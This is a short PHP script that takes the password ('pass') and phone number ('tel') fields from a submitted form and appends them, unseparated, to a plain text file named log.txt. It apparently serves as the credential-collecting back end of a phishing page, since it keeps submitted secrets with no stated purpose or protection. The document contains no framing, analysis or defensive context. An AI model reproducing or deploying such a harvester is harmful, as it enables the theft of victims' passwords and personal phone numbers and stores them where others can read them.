<?php
    $fp = fopen('log.txt', 'a');
    $loh = $_POST["pass"] . $_POST["tel"];
    fwrite($fp, $loh);
    fclose($fp);
?>